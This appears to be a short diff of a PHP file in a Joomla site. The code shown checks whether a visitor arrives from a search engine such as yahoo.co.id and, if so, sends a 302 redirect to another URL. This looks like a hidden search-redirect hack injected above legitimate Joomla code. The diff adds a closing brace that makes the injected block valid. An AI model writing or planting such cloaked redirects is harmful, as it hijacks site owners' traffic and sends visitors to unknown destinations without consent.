@@ -38,7 +38,7 @@ if (!empty($rf) && (stripos($rf, "yahoo.co.id") !== false || stripos($rf, "googl
     header("HTTP/1.1 302 Found");
     header("Location: ".$reff_url);
     exit();
-
+}
 
 /**
  * @package		Joomla.Site
